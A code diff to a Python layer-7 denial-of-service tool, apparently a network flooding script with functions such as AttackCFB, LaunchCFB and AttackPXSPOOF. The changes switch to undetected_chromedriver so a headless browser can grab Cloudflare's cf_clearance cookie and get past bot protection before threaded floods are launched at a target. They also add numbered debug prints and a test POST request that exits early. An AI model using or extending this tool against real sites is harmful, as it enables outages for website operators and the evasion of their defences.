@@ -4,9 +4,16 @@ from os import system, name
 import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
-# import undetected_chromedriver as webdriver
+import undetected_chromedriver as webdriver
+import undetected_chromedriver as uc
+import urllib.request
+import certifi
+import ssl
 from sys import stdout
 from colorama import Fore, init
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
+
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -59,7 +66,11 @@ def get_proxies():
 
 def get_cookie(url):
     global useragent, cookieJAR, cookie
+    print(5555557575)
+    
     options = webdriver.ChromeOptions()
+    print(44444444444)
+
     arguments = [
     '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
     '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
@@ -67,13 +78,21 @@ def get_cookie(url):
     ]
     for argument in arguments:
         options.add_argument(argument)
-    driver = webdriver.Chrome(options=options)
+    print(777777777,options)
+    
+    driver = uc.Chrome(options=options)
+    print(8888888)
+
     driver.implicitly_wait(3)
     driver.get(url)
+    print(22222222222)
     for _ in range(60):
         cookies = driver.get_cookies()
         tryy = 0
+        print(333333333)
+
         for i in cookies:
+            print(i)
             if i['name'] == 'cf_clearance':
                 cookieJAR = driver.get_cookies()[tryy]
                 useragent = driver.execute_script("return navigator.userAgent")
@@ -85,6 +104,7 @@ def get_cookie(url):
                 pass
         time.sleep(1)
     driver.quit()
+    print(1111)
     return False
 
 def spoof(target):
@@ -498,6 +518,7 @@ def AttackPXSPOOF(target, until_datetime, req, proxy): #
 def LaunchCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
+    
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
@@ -1210,6 +1231,7 @@ def command():
     elif command == "cfreq" or command == "CFREQ":
         target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
@@ -1378,6 +1400,18 @@ if __name__ == '__main__':
             timer.join()
     elif method == "cfreq":
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        headers = {'User-Agent': 'Mozilla/5.0'}
+
+        data = urllib.parse.urlencode({'key': 'value'}).encode()  # Example data for POST request
+        print(target)
+        req = urllib.request.Request(target, data=data, headers=headers, method='POST')
+
+        try:
+            response = urllib.request.urlopen(req)
+            print(response.read())
+        except urllib.error.URLError as e:
+            print(f"Request failed: {e}")
+        exit()
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
